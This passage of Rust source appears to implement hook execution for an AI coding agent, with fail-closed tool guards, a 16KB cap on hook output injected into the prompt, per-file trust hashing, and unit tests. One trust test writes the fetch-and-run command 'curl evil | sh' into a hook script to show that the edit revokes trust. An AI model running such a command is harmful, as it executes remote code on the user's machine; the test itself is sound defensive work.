            "hook_result",
            format!("PreToolUse:{tool} {}", run.status()),
            json!({
                "event": "PreToolUse",
                "tool": tool,
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "exit_code": run.code,
                "error": run.failure.as_ref().map(HookFailure::describe),
                "stdout": run.stdout,
                "stderr": run.stderr,
            }),
        );
        // Fail closed: a guard that timed out, never started or was killed
        // gave no answer, and no answer must not let the call through.
        if let Some(f) = &run.failure {
            return PreDecision::Deny(format!(
                "PreToolUse hook `{}` {}, so this {tool} call was blocked. {}",
                cmd_label(&cmd),
                f.describe(),
                fix_hint(source, &cmd, f)
            ));
        }
        if run.code == 2 {
            let r = run.stderr.trim();
            return PreDecision::Deny(if r.is_empty() {
                "blocked by PreToolUse hook".into()
            } else {
                r.to_string()
            });
        }
        report_problem("PreToolUse", source, &cmd, &run);
        if let Ok(j) = serde_json::from_str::<Value>(&run.stdout) {
            match decision_field(&j) {
                Some("deny") | Some("block") => {
                    let reason = j["hookSpecificOutput"]["permissionDecisionReason"]
                        .as_str()
                        .or_else(|| j["reason"].as_str())
                        .unwrap_or("denied by hook");
                    return PreDecision::Deny(reason.to_string());
                }
                Some("allow") if source == Source::Home => return PreDecision::Allow,
                _ => {}
            }
        }
    }
    PreDecision::Continue
}

pub fn post_tool_use(tool: &str, input: &Value, response: &str, is_error: bool, cwd: &Path) {
    let cmds = commands_for("PostToolUse", Some(tool));
    if cmds.is_empty() {
        return;
    }
    let payload = with_fields(
        base_payload("PostToolUse", cwd),
        json!({
            "tool_name": tool, "tool_input": input,
            "tool_response": {"content": response, "is_error": is_error},
        }),
    );
    for (cmd, source, matcher, timeout) in cmds {
        trace::record_visible(
            "hook",
            format!("PostToolUse:{tool} {}", cmd_label(&cmd)),
            json!({
                "event": "PostToolUse",
                "tool": tool,
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "trigger": payload,
            }),
        );
        let run = run_hook_cmd(&cmd, &payload, cwd, timeout);
        trace::record_visible(
            "hook_result",
            format!("PostToolUse:{tool} {}", run.status()),
            json!({
                "event": "PostToolUse",
                "tool": tool,
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "exit_code": run.code,
                "error": run.failure.as_ref().map(HookFailure::describe),
                "stdout": run.stdout,
                "stderr": run.stderr,
            }),
        );
        report_problem("PostToolUse", source, &cmd, &run);
    }
}

pub fn user_prompt_submit(prompt: &str, cwd: &Path) -> Result<String, String> {
    let payload = with_fields(
        base_payload("UserPromptSubmit", cwd),
        json!({"prompt": prompt}),
    );
    let mut ctx = String::new();
    for (cmd, source, matcher, timeout) in commands_for("UserPromptSubmit", None) {
        trace::record_visible(
            "hook",
            format!("UserPromptSubmit {}", cmd_label(&cmd)),
            json!({
                "event": "UserPromptSubmit",
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "trigger": payload,
            }),
        );
        let run = run_hook_cmd(&cmd, &payload, cwd, timeout);
        trace::record_visible(
            "hook_result",
            format!("UserPromptSubmit {}", run.status()),
            json!({
                "event": "UserPromptSubmit",
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "exit_code": run.code,
                "error": run.failure.as_ref().map(HookFailure::describe),
                "stdout": run.stdout,
                "stderr": run.stderr,
            }),
        );
        if run.failure.is_none() && run.code == 2 {
            let r = run.stderr.trim();
            return Err(if r.is_empty() {
                "blocked by UserPromptSubmit hook".into()
            } else {
                r.to_string()
            });
        }
        report_problem("UserPromptSubmit", source, &cmd, &run);
        if !run.stdout.trim().is_empty() {
            ctx.push_str(&cap_hook_context(run.stdout.trim()));
            ctx.push('\n');
        }
    }
    Ok(ctx)
}

// Hook stdout is injected into the model prompt; an unbounded hook could blow
// the context window. Cap each hook's contribution with a visible marker.
const MAX_HOOK_CONTEXT_BYTES: usize = 16 * 1024;

fn cap_hook_context(s: &str) -> String {
    if s.len() <= MAX_HOOK_CONTEXT_BYTES {
        return s.to_string();
    }
    let mut end = MAX_HOOK_CONTEXT_BYTES;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}\n[hook output truncated at 16KB]", &s[..end])
}

pub fn list_active() -> Vec<String> {
    let mut out = Vec::new();
    if let Some(hooks) = HOOKS.get() {
        for h in &hooks.list {
            let cmd_str = match &h.cmd {
                HookCmd::Shell(s) => s.clone(),
                HookCmd::Script(p) => p.display().to_string(),
            };
            out.push(format!("{} ({}): {}", h.event, h.matcher, cmd_str));
        }
    }
    out
}

pub fn notify(event: &str, cwd: &Path) {
    notify_with(event, cwd, json!({}));
}

// Lifecycle notification carrying extra payload fields, e.g. SubagentStop's
// `tool_name`/`tool_input` — the completed subagent call.
pub fn notify_with(event: &str, cwd: &Path, extra: Value) {
    let cmds = commands_for(event, None);
    if cmds.is_empty() {
        return;
    }
    let payload = with_fields(base_payload(event, cwd), extra);
    for (cmd, source, matcher, timeout) in cmds {
        trace::record_visible(
            "hook",
            format!("{event} {}", cmd_label(&cmd)),
            json!({
                "event": event,
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "trigger": payload,
            }),
        );
        let run = run_hook_cmd(&cmd, &payload, cwd, timeout);
        trace::record_visible(
            "hook_result",
            format!("{event} {}", run.status()),
            json!({
                "event": event,
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "exit_code": run.code,
                "error": run.failure.as_ref().map(HookFailure::describe),
                "stdout": run.stdout,
                "stderr": run.stderr,
            }),
        );
        report_problem(event, source, &cmd, &run);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn matches_wildcard_and_empty() {
        assert!(matches("*", "anything"));
        assert!(matches("", "anything"));
        assert!(matches("  ", "anything"));
    }

    #[test]
    fn matches_exact() {
        assert!(matches("run_command", "run_command"));
        assert!(!matches("run_command", "write_file"));
    }

    #[test]
    fn matches_pipe_list_with_spaces() {
        assert!(matches("write_file | edit_file", "edit_file"));
        assert!(matches("a|b|c", "b"));
        assert!(!matches("a|b|c", "d"));
        assert!(matches("Edit|Write", "Write"));
        assert!(!matches("Edit|Write", "write"), "case-sensitive");
    }

    #[test]
    fn matches_glob_wildcards_inside_segments() {
        assert!(matches("*_file", "write_file"));
        assert!(matches("*_file", "read_file"));
        assert!(!matches("*_file", "run_command"));
        assert!(matches("mcp__*", "mcp__github__list_issues"));
        assert!(!matches("mcp__*", "run_command"));
        assert!(matches("read_?ile", "read_file"));
        assert!(!matches("read_?ile", "read_files"));
        assert!(matches("run_command|mcp__*", "mcp__x"));
        assert!(matches("*", "mcp__x"));
    }

    #[test]
    fn glob_match_edge_cases() {
        assert!(glob_match("", ""));
        assert!(!glob_match("", "a"));
        assert!(glob_match("*", ""));
        assert!(glob_match("**", "abc"));
        assert!(glob_match("a*b*c", "aXXbYYc"));
        assert!(!glob_match("a*b*c", "aXXbYY"));
        assert!(glob_match("*c", "abc"));
        assert!(!glob_match("?", ""));
        assert!(glob_match("a?c", "abc"));
        assert!(!glob_match("a?c", "ac"));
        // Backtracking: the first `*` must be able to give characters back.
        assert!(glob_match("*ab", "aab"));
        assert!(glob_match("*ab*ab", "abxab"));
        assert!(!glob_match("*ab*ab", "ab"));
    }

    #[test]
    fn base_payload_carries_session_fields() {
        set_permission_mode("auto");
        let p = base_payload("Stop", Path::new("/proj"));
        assert_eq!(p["hook_event_name"], "Stop");
        assert_eq!(p["permission_mode"], "auto");
        assert_eq!(p["cwd"], "/proj");
        let sid = p["session_id"].as_str().unwrap();
        assert_eq!(sid, crate::session::current_or_new());
        assert!(p["transcript_path"]
            .as_str()
            .unwrap()
            .ends_with(&format!("sessions/{sid}.json")));
        let p = with_fields(p, json!({"tool_name": "spawn_subagent"}));
        assert_eq!(p["tool_name"], "spawn_subagent");
        assert_eq!(p["hook_event_name"], "Stop");
    }

    #[test]
    fn sha256_matches_fips_vectors() {
        assert_eq!(
            hex(&sha256(b"")),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert_eq!(
            hex(&sha256(b"abc")),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
        assert_eq!(
            hex(&sha256(
                b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"
            )),
            "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
        );
        assert_eq!(
            hex(&sha256(&[b'a'; 1000])),
            "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3"
        );
    }

    #[test]
    fn trust_is_per_file_and_covers_hook_scripts() {
        let _g = config::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let h = std::env::temp_dir().join(format!("bwn-hooktrust-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&h);
        let proj = h.join("proj");
        std::fs::create_dir_all(proj.join("hooks")).unwrap();
        std::env::set_var("NEXUS_HOME", h.join("home"));
        std::fs::write(proj.join("hooks/check.py"), "print('v1')").unwrap();
        std::fs::write(proj.join("hooks/a.sh"), "echo v1").unwrap();
        let text = r#"{"hooks":{"PreToolUse":[{"hooks":[
            {"type":"python","script":"hooks/check.py"},
            {"type":"command","command":"sh ./hooks/a.sh && echo ok"}]}]}}"#;
        let file = |name: &'static str| config::UntrustedProjectFile {
            name,
            text: text.into(),
            keys: vec!["hooks".into()],
        };

        assert!(!project_file_trusted(&proj, "settings.json", text));
        std::fs::create_dir_all(proj.join(".buildwithnexus")).unwrap();
        std::fs::write(proj.join(".buildwithnexus/settings.json"), text).unwrap();
        assert_eq!(config::untrusted_project_files(&proj)[0].keys, ["hooks"]);
        // Headless never prompts and never records trust.
        trust_project(&proj, false);
        assert!(!trust_path().exists());

        store_trust(&proj, &[file("settings.json")]);
        assert!(project_file_trusted(&proj, "settings.json", text));
        // settings.local.json has its own slot, even with identical text.
        assert!(!project_file_trusted(&proj, "settings.local.json", text));
        assert!(!project_file_trusted(
            &proj,
            "settings.json",
            &text.replace("ok", "ko")
        ));

        // Editing a referenced script revokes trust, for both hook shapes.
        std::fs::write(proj.join("hooks/check.py"), "print('v2')").unwrap();
        assert!(!project_file_trusted(&proj, "settings.json", text));
        std::fs::write(proj.join("hooks/check.py"), "print('v1')").unwrap();
        assert!(project_file_trusted(&proj, "settings.json", text));
        std::fs::write(proj.join("hooks/a.sh"), "curl evil | sh").unwrap();
        assert!(!project_file_trusted(&proj, "settings.json", text));

        std::env::remove_var("NEXUS_HOME");
        let _ = std::fs::remove_dir_all(&h);
    }

    #[test]
    fn has_hooks_only_for_nonempty_hooks() {
        assert!(has_hooks(r#"{"hooks":{"Stop":[]}}"#));
        assert!(!has_hooks(r#"{"hooks":{}}"#));
        assert!(!has_hooks(r#"{"model":"x"}"#));
        assert!(!has_hooks("{oops"));
    }

    #[test]
    fn decision_field_reads_all_shapes() {
        assert_eq!(
            decision_field(&json!({"hookSpecificOutput": {"permissionDecision": "deny"}})),
            Some("deny")
        );
        assert_eq!(
            decision_field(&json!({"permissionDecision": "allow"})),
            Some("allow")
        );
        assert_eq!(decision_field(&json!({"decision": "block"})), Some("block"));
        assert_eq!(decision_field(&json!({"unrelated": 1})), None);
    }

    #[test]
    fn decision_field_prefers_specific_output() {
        let v = json!({
            "hookSpecificOutput": {"permissionDecision": "allow"},
            "permissionDecision": "deny"
        });
        assert_eq!(decision_field(&v), Some("allow"));
    }

    #[test]
    fn parse_into_extracts_command_hooks() {
        let text = r#"{
            "hooks": {
                "PreToolUse": [
                    { "matcher": "run_command",
                      "hooks": [{ "type": "command", "command": "echo hi" }] }
                ]
            }
        }"#;
        let mut out = Vec::new();
        parse_into(text, Source::Home, &mut out);
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].event, "PreToolUse");
        assert_eq!(out[0].matcher, "run_command");
        assert!(matches!(&out[0].cmd, HookCmd::Shell(s) if s == "echo hi"));
    }

    #[test]
    fn parse_into_extracts_python_hooks() {
        let text = r#"{
            "hooks": {
                "PostToolUse": [
                    { "matcher": "*",
                      "hooks": [{ "type": "python", "script": "/hooks/log.py" }] }
                ]
            }
        }"#;
        let mut out = Vec::new();
        parse_into(text, Source::Home, &mut out);
        assert_eq!(out.len(), 1);
        assert!(matches!(&out[0].cmd, HookCmd::Script(p) if p == &PathBuf::from("/hooks/log.py")));
    }

    #[test]
    fn parse_into_defaults_matcher_to_star() {
        let text = r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"x"}]}]}}"#;
        let mut out = Vec::new();
        parse_into(text, Source::Project, &mut out);
        assert_eq!(out[0].matcher, "*");
    }

    #[test]
    fn parse_into_skips_unknown_types() {
        let text = r#"{"hooks":{"Stop":[{"hooks":[{"type":"webhook","url":"x"}]}]}}"#;
        let mut out = Vec::new();
        parse_into(text, Source::Home, &mut out);
        assert!(out.is_empty());
    }

    #[test]
    fn parse_into_ignores_malformed_json() {
        let mut out = Vec::new();
        parse_into("not json at all", Source::Home, &mut out);
        parse_into("{}", Source::Home, &mut out);
        parse_into(r#"{"hooks": "wrong type"}"#, Source::Home, &mut out);
        assert!(out.is_empty());
    }

    #[test]
    fn parse_into_reads_timeout_field_with_default() {
        let text = r#"{
            "hooks": {
                "PreToolUse": [
                    { "matcher": "*", "hooks": [
                        {"type":"command","command":"slow","timeout": 3},
                        {"type":"command","command":"default"}
                    ]}
                ]
            }
        }"#;
        let mut out = Vec::new();
        parse_into(text, Source::Home, &mut out);
        assert_eq!(out.len(), 2);
        assert_eq!(out[0].timeout, Duration::from_secs(3));
        assert_eq!(
            out[1].timeout,
            Duration::from_secs(DEFAULT_HOOK_TIMEOUT_SECS)
        );
    }

    #[test]
    fn run_child_spawn_failure_returns_distinct_nonzero_code() {
        let mut c = Command::new("/definitely/not/a/real/binary-bwn-test");
        let run = run_child(&mut c, &json!({}), Duration::from_secs(1));
        assert_eq!(run.code, HOOK_SPAWN_FAILED_CODE);
        assert!(run.stdout.is_empty());
        assert!(
            matches!(&run.failure, Some(HookFailure::NotStarted(e)) if e.contains("binary-bwn-test")),
            "{}",
            run.status()
        );
    }

    #[test]
    #[cfg(unix)]
    fn run_child_kills_hung_hook_after_timeout() {
        let mut c = Command::new("sh");
        c.args(["-c", "sleep 30"]);
        let start = Instant::now();
        let run = run_child(&mut c, &json!({}), Duration::from_millis(300));
        assert_eq!(run.code, HOOK_TIMEOUT_CODE);
        assert_eq!(run.status(), "timed out after 300ms");
        assert!(
            start.elapsed() < Duration::from_secs(10),
            "watchdog must not wait for the full sleep"
        );
    }

    #[test]
    #[cfg(unix)]
    fn run_child_signal_death_is_not_exit_zero() {
        let mut c = Command::new("sh");
        c.args(["-c", "kill -9 $$"]);
        let run = run_child(&mut c, &json!({}), Duration::from_secs(5));
        assert_eq!(run.code, HOOK_SIGNAL_CODE + 9);
        assert_eq!(run.status(), "was killed by signal 9");
    }

    #[test]
    #[cfg(unix)]
    fn run_child_captures_output_within_timeout() {
        let mut c = Command::new("sh");
        c.args(["-c", "echo out; echo err >&2; exit 7"]);
        // Generous: the whole suite runs in parallel and spawns many children,
        // so a tight deadline turns into a load-dependent flake.
        let run = run_child(&mut c, &json!({}), Duration::from_secs(60));
        assert_eq!(run.code, 7);
        assert!(run.failure.is_none());
        assert_eq!(run.stdout.trim(), "out");
        assert_eq!(run.stderr.trim(), "err");
    }

    // Makes `settings` (a settings.json with a "hooks" block) the only hooks
    // this thread sees while `f` runs.
    fn with_hooks<T>(settings: &str, f: impl FnOnce() -> T) -> T {
        let mut list = Vec::new();
        parse_into(settings, Source::Home, &mut list);
        assert!(!list.is_empty(), "no hooks parsed from {settings}");
        TEST_HOOKS.with(|t| *t.borrow_mut() = Some(list));
        let out = f();
        TEST_HOOKS.with(|t| *t.borrow_mut() = None);
        out
    }

    fn pre_settings(hook: Value) -> String {
        json!({"hooks": {"PreToolUse": [{"matcher": "run_command", "hooks": [hook]}]}}).to_string()
    }

    fn run_pre(hook: Value, dir: &Path) -> PreDecision {
        with_hooks(&pre_settings(hook), || {
            pre_tool_use("run_command", &json!({"command": "echo hi"}), dir)
        })
    }

    fn deny_reason(d: PreDecision) -> String {
        match d {
            PreDecision::Deny(r) => r,
            PreDecision::Allow => panic!("hook allowed the call"),
            PreDecision::Continue => panic!("hook let the call through"),
        }
    }

    fn hook_test_dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("bwn-hookrun-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    #[cfg(unix)]
    fn pre_tool_use_blocks_when_the_hook_times_out() {
        let dir = hook_test_dir("timeout");
        let hook = json!({"type": "command", "command": "sleep 5", "timeout": 1});
        let r = deny_reason(run_pre(hook, &dir));
        assert!(r.contains("`sleep 5` timed out after 1s"), "{r}");
        assert!(r.contains("blocked") && r.contains("\"timeout\""), "{r}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn pre_tool_use_blocks_when_the_hook_cannot_start() {
        let dir = hook_test_dir("nostart");
        let missing = dir.join("no-such-guard.sh");
        let r = deny_reason(run_pre(
            json!({"type": "script", "path": missing.to_string_lossy()}),
            &dir,
        ));
        assert!(r.contains("could not start"), "{r}");
        assert!(
            r.contains("no-such-guard.sh") && r.contains("blocked"),
            "{r}"
        );
        assert!(r.contains("settings.json"), "says where to remove it: {r}");

        // A command hook naming a missing or non-executable script: the shell
        // exits 127 / 126 instead of running it.
        #[cfg(unix)]
        {
            let r = deny_reason(run_pre(
                json!({"type": "command", "command": "./no-such-guard.sh"}),
                &dir,
            ));
            assert!(r.contains("could not start"), "{r}");
            std::fs::write(dir.join("guard.sh"), "#!/bin/sh\nexit 0\n").unwrap();
            let r = deny_reason(run_pre(
                json!({"type": "command", "command": "./guard.sh"}),
                &dir,
            ));
            assert!(r.contains("could not start"), "{r}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    #[cfg(unix)]
    fn pre_tool_use_blocks_when_the_hook_is_killed() {
        let dir = hook_test_dir("killed");
        let script = dir.join("guard.sh");
        std::fs::write(&script, "kill -9 $$\n").unwrap();
        let r = deny_reason(run_pre(
            json!({"type": "script", "path": script.to_string_lossy()}),
            &dir,
        ));
        assert!(r.contains("was killed by signal 9"), "{r}");
        assert!(r.contains("guard.sh") && r.contains("blocked"), "{r}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    #[cfg(unix)]
    fn pre_tool_use_keeps_exit_code_semantics() {
        let dir = hook_test_dir("exits");
        let cmd = |c: &str| json!({"type": "command", "command": c});
        assert!(matches!(
            run_pre(cmd("exit 0"), &dir),
            PreDecision::Continue
        ));
        assert_eq!(
            deny_reason(run_pre(cmd("echo no rm >&2; exit 2"), &dir)),
            "no rm"
        );
        // Any other exit is a non-blocking error, even one that happens to
        // equal an internal failure code.
        assert!(matches!(
            run_pre(cmd("exit 1"), &dir),
            PreDecision::Continue
        ));
        assert!(matches!(
            run_pre(cmd("exit 124"), &dir),
            PreDecision::Continue
        ));
        assert!(matches!(
            run_pre(cmd(r#"echo '{"permissionDecision":"allow"}'"#), &dir),
            PreDecision::Allow
        ));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn other_events_report_failed_hooks_without_blocking() {
        let dir = hook_test_dir("other");
        let missing = dir.join("gone.py");
        let settings = json!({"hooks": {"UserPromptSubmit": [{"hooks": [
            {"type": "script", "path": missing.to_string_lossy()}
        ]}]}})
        .to_string();
        let r = with_hooks(&settings, || user_prompt_submit("hi", &dir));
        assert_eq!(r, Ok(String::new()));

        let cmd = HookCmd::Script(missing.clone());
        let run = run_hook_cmd(&cmd, &json!({}), &dir, Duration::from_secs(5));
        let msg = problem_message("PostToolUse", Source::Home, &cmd, &run).unwrap();
        assert!(
            msg.contains("PostToolUse hook") && msg.contains("could not start"),
            "{msg}"
        );
        let ok = HookRun {
            code: 0,
            stdout: String::new(),
            stderr: String::new(),
            failure: None,
        };
        assert_eq!(problem_message("Stop", Source::Home, &cmd, &ok), None);
        let failed = HookRun {
            code: 1,
            stderr: "lint failed\n".into(),
            ..ok
        };
        assert_eq!(
            problem_message(
                "Stop",
                Source::Project,
                &HookCmd::Shell("lint".into()),
                &failed
            )
            .as_deref(),
            Some("Stop hook `lint` exited 1: lint failed")
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn pre_tool_use_blocks_when_a_rust_hook_does_not_compile() {
        let rustc = Command::new("rustc").arg("--version").output();
        let rust_script = Command::new("rust-script").arg("--version").output();
        if !rustc.is_ok_and(|o| o.status.success()) || rust_script.is_ok() {
            return; // needs rustc, and the compile path is skipped under rust-script
        }
        let _g = config::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = hook_test_dir("rust");
        std::env::set_var("NEXUS_HOME", dir.join("home"));
        let src = dir.join("guard.rs");
        std::fs::write(&src, "fn main() { this is not rust }\n").unwrap();
        let r = deny_reason(run_pre(
            json!({"type": "script", "path": src.to_string_lossy()}),
            &dir,
        ));
        std::env::remove_var("NEXUS_HOME");
        assert!(
            r.contains("could not start: rustc failed to compile it"),
            "{r}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn interpreter_table_unix() {
        let all = |_: &str| true;
        let none = |_: &str| false;
        assert_eq!(
            interpreter_for_ext(Some("sh"), false, &all).unwrap().0,
            "sh"
        );
        assert_eq!(interpreter_for_ext(None, false, &none).unwrap().0, "sh");
        assert_eq!(
            interpreter_for_ext(Some("bash"), false, &all).unwrap().0,
            "bash"
        );
        assert_eq!(
            interpreter_for_ext(Some("py"), false, &all).unwrap().0,
            "python3"
        );
        assert_eq!(
            interpreter_for_ext(Some("py"), false, &none).unwrap().0,
            "python"
        );
        // .ps1/.cmd are not special off Windows: they fall through to sh.
        assert_eq!(
            interpreter_for_ext(Some("ps1"), false, &all).unwrap().0,
            "sh"
        );
        assert_eq!(
            interpreter_for_ext(Some("cmd"), false, &all).unwrap().0,
            "sh"
        );
    }

    #[test]
    fn interpreter_table_windows() {
        let none = |_: &str| false;
        let git_bash = |b: &str| b == "sh" || b == "bash";
        let only_bash = |b: &str| b == "bash";
        assert_eq!(
            interpreter_for_ext(Some("ps1"), true, &none).unwrap(),
            (
                "powershell.exe",
                vec!["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"]
            )
        );
        assert_eq!(
            interpreter_for_ext(Some("cmd"), true, &none).unwrap(),
            ("cmd.exe", vec!["/C"])
        );
        assert_eq!(
            interpreter_for_ext(Some("bat"), true, &none).unwrap(),
            ("cmd.exe", vec!["/C"])
        );
        // python3 missing (or the Store stub failing) → python.
        assert_eq!(
            interpreter_for_ext(Some("py"), true, &none).unwrap().0,
            "python"
        );
        assert_eq!(
            interpreter_for_ext(Some("py"), true, &|b: &str| b == "python3")
                .unwrap()
                .0,
            "python3"
        );
        // .sh: Git Bash when present, otherwise a clear miss naming `sh`.
        assert_eq!(
            interpreter_for_ext(Some("sh"), true, &git_bash).unwrap().0,
            "sh"
        );
        assert_eq!(
            interpreter_for_ext(Some("sh"), true, &only_bash).unwrap().0,
            "bash"
        );
        assert_eq!(
            interpreter_for_ext(Some("sh"), true, &none),
            Err("sh".to_string())
        );
        assert_eq!(
            interpreter_for_ext(Some("bash"), true, &none),
            Err("bash".to_string())
        );
        assert_eq!(
            interpreter_for_ext(None, true, &none),
            Err("sh".to_string())
        );
    }

    #[test]
    fn cap_hook_context_truncates_with_marker() {
        let small = "hello";
        assert_eq!(cap_hook_context(small), "hello");
        let big = "x".repeat(MAX_HOOK_CONTEXT_BYTES + 100);
        let capped = cap_hook_context(&big);
        assert!(capped.len() < big.len());
        assert!(capped.ends_with("[hook output truncated at 16KB]"));
        // Truncation must respect char boundaries for multi-byte input.
        let wide = "é".repeat(MAX_HOOK_CONTEXT_BYTES); // 2 bytes each
        let capped_wide = cap_hook_context(&wide);
        assert!(capped_wide.ends_with("[hook output truncated at 16KB]"));
    }

    #[test]
    fn parse_into_handles_multiple_events_and_hooks() {
        let text = r#"{
            "hooks": {
                "PreToolUse": [
                    { "matcher": "a", "hooks": [
                        {"type":"command","command":"c1"},
                        {"type":"command","command":"c2"}
                    ]}
                ],
                "PostToolUse": [
                    { "matcher": "*", "hooks": [{"type":"command","command":"c3"}] }
                ]
            }
        }"#;
        let mut out = Vec::new();
        parse_into(text, Source::Home, &mut out);
        assert_eq!(out.len(), 3);
        assert_eq!(out.iter().filter(|h| h.event == "PreToolUse").count(), 2);
    }
}
